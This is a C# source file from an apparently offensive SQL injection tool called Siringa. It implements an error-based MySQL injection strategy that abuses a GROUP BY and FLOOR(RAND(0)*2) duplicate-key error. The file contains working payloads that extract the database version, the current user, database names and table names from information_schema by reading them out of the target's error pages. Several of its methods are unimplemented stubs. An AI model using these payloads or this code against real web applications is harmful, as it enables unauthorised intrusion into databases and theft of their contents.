using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Siringa.Engine.Interfaces;
using Siringa.Engine.Implementations.QueryRunner;
using Siringa.Engine.Utils;

namespace Siringa.Engine.Implementations.InjectionStrategies.MySql.ErrorBased
{
    public class GroupByIntegrityConstraintViolation : IInjectionStrategy
    {
        #region Constructor

        public GroupByIntegrityConstraintViolation()
        {
            QueryRunner = new SimpleQueryRunner();
        }

        #endregion Constructor

        #region Private
        #region Payloads
        private const char _tail = '1';
        private const string _exploit = " AND (SELECT 1 FROM (SELECT COUNT(*),"+ 
                                                            "CONCAT(({0}), FLOOR(RAND(0)*2)) x "+
                                                            "FROM information_schema.tables GROUP BY x) z)";
        private const string _payloadGetUsername = "SELECT CURRENT_USER()";
        private const string _payloadGetVersion = "SELECT @@version";
        private const string _payloadGetSingleDatabaseName = "SELECT distinct table_schema FROM information_schema.TABLES limit {0},1";
        //WHERE table_schema NOT IN ('mysql', 'performance_schema', 'information_schema')
        private const string _payloadGetDatabasesCount = "select count(distinct table_schema) from information_schema.tables";
        //WHERE table_schema NOT IN ('mysql', 'performance_schema', 'information_schema')
        private const string _payloadCheckVulnerable = "select ‘victim’";
        private const string _payloadGetCurrentDatabaseName = "SELECT database()";

        private const string _injectionResultLowerBound = "Integrity constraint violation: 1062 Duplicate entry '";
        private const string _injectionResultUpperBound = "' for key 'group_key'";

        private const string _payloadGetSingleTableNameFromDb = "SELECT table_name FROM information_schema.TABLES WHERE table_schema = '{0}' LIMIT {1},1";
        private const string _payloadGetSingleTableName = "SELECT table_name FROM information_schema.TABLES LIMIT {1},1";

        private const string _payloadGetTableCountFromDb = "SELECT count(table_name) FROM information_schema.TABLES where table_schema = '{0}'";
        private const string _payloadGetTableCount = "SELECT count(table_name) FROM information_schema.TABLES";

        #endregion Payloads

        #region Methods
        private string GetAnswerFromHtml(string html)
        {
            string result = string.Empty;

            if(!string.IsNullOrEmpty(html))
                result = html.Substring(html.IndexOf(_injectionResultLowerBound) +
                                            _injectionResultLowerBound.Length,
                                            html.IndexOf(_injectionResultUpperBound) - html.IndexOf(_injectionResultLowerBound) -
                                            _injectionResultLowerBound.Length);

            result = result.Remove(result.Length - 1, 1);

            return result;
        }
        #endregion Methods

        #endregion Private

        #region Public

        public IQueryRunner QueryRunner { get; set; }

        public string DbVulnerableVersionFrom 
        {
            get
            {
                return "5.1.63";
            }
        }
        public string DbVulnerableVersionTo 
        {
            get
            {
                return "5.1.64";
            }
        }

        public string Url { get; set; }

        public string DisplayName { get { return "Mysql \"group by\" integrity constraint violation method"; } }

        public string SelectedDb { get; set; }
        public string SelectedTable { get; set; }

        public bool TestIfVulnerable()
        {
            return !string.IsNullOrEmpty(GetDbVersion());
        }

        public string GetDbVersion()
        {
            string result = string.Empty;
            string query = QueryHelper.CreateQuery(Url,_exploit,_payloadGetVersion);
            string pageHtml = QueryRunner.GetPageHtml(query);
            result = GetAnswerFromHtml(pageHtml);
            return result;
        }

        public string GetDbUserName()
        {
            string result = string.Empty;
            string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetUsername);
            string pageHtml = QueryRunner.GetPageHtml(query);
            result = GetAnswerFromHtml(pageHtml);
            return result;
        }
        public string GetCurrentDbName()
        {
            string result = string.Empty;
            string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetCurrentDatabaseName);
            string pageHtml = QueryRunner.GetPageHtml(query);
            result = GetAnswerFromHtml(pageHtml);
            return result;
        }

        public int GetTotalNoOfDbs()
        {
            int count = 0;
            string query = QueryHelper.CreateQuery(Url, _exploit, _payloadGetDatabasesCount);
            string pageHtml = QueryRunner.GetPageHtml(query);
            string countString = GetAnswerFromHtml(pageHtml);
            int.TryParse(countString, out count);
            return count;
        }

        public int GetTotalNoOfTables()
        {
            int count = 0;
            string payload = string.Empty;
            if (!string.IsNullOrEmpty(SelectedDb))
                payload = string.Format(_payloadGetTableCountFromDb, SelectedDb);
            else
                payload = _payloadGetTableCount;
            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
            string pageHtml = QueryRunner.GetPageHtml(query);
            string countString = GetAnswerFromHtml(pageHtml);
            int.TryParse(countString, out count);
            return count;
        }

        public int GetTotalNoOfColumns()
        {
            return 0;
        }

        public string GetSingleDatabaseName(int startingFrom)
        {
            string result = string.Empty;
            string query = QueryHelper.CreateQuery(Url, _exploit, string.Format(_payloadGetSingleDatabaseName, startingFrom.ToString()));
            string pageHtml = QueryRunner.GetPageHtml(query);
            result = GetAnswerFromHtml(pageHtml);
            return result;
        }
        public string GetSingleTableName(int startingFrom)
        {
            string result = string.Empty;
            string payload = string.Empty;
            if (!string.IsNullOrEmpty(SelectedDb))
                payload = string.Format(_payloadGetSingleTableNameFromDb, SelectedDb, startingFrom);
            else
                payload = string.Format(_payloadGetSingleTableName, startingFrom);
            string query = QueryHelper.CreateQuery(Url, _exploit, payload);
            string pageHtml = QueryRunner.GetPageHtml(query);
            result = GetAnswerFromHtml(pageHtml);
            return result;
        }
        public string GetSingleTableColumnName(int startingFrom)
        {
            string result = string.Empty;
            //@TODO: actually implement
            return result;
        }

        public string GetSingleCustomQueryRow(string query)
        {
            string result = string.Empty;
            //@TODO: actually implement
            return result;
        }

        public string GetMultipleDatabaseNames(int startingFrom, int count)
        {
            string result = string.Empty;
            //@TODO: actually implement
            return result;
        }
        public string GetTableNames(int startingFrom, int count)
        {
            string result = string.Empty;
            //@TODO: actually implement
            return result;
        }
        public string GetTableColumnName(int startingFrom, int count)
        {
            string result = string.Empty;
            //@TODO: actually implement
            return result;
        }
        public string GetMultipleCustomQueryRow(string query, int count)
        {
            string result = string.Empty;
            //@TODO: actually implement
            return result;
        }

        #endregion Public
    }
}
